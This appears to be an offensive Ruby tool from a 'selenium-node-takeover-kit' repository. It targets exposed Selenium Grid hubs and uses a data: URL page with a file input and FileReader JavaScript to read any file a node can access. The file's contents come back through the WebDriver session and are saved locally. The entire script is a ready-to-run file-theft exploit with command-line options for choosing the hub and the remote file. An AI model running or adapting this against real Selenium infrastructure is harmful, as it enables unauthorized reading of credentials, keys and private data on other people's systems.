#!/usr/bin/env ruby
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_cat.rb
# 
# A quick and light version of selenium_node_download.py that doesnt handle binary files.
# Simply creates a connection and loads the remote file with the browser.

require 'selenium-webdriver'
require 'base64'
require 'optparse'

options = {}
OptionParser.new do |opts|
  opts.banner = 'Usage: example.rb [options]'
  opts.on('-hURL', '--hubURL', 'Selenium Hub URL') do |h|
    options[:hub] = h
  end
  opts.on('-rFILE', '--remoteFILE', 'The Remote file to download.') do |r|
    options[:remote] = r
  end
  opts.on('-lFILE', '--localFILE', 'The Local file to save the dowloaded file too.') do |r|
    options[:local] = r
  end
  opts.on('--help', 'Prints this help') do
    puts opts
    exit
  end
end.parse!

hub_url = options[:hub]
remote_file = options[:remote]
local_file = options[:local]

# Nothing special about the driver here. Probably would work on any browser
driver = Selenium::WebDriver.for :remote, :url => hub_url, :desired_capabilities => { :browserName => 'firefox' }

# https://www.selenium.dev/documentation/en/remote_webdriver/remote_webdriver_client/
driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
driver.find_element(id: 'f').send_keys(remote_file) # Load local file into input field (and therefor "inf")
js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
decoded_contents = Base64.decode64(js_return.split(',')[1])

if local_file
  File.open(local_file, "wb") do |f|
      f.write(decoded_contents)
  end 
else
  puts(decoded_contents)
end

driver.quit
exit
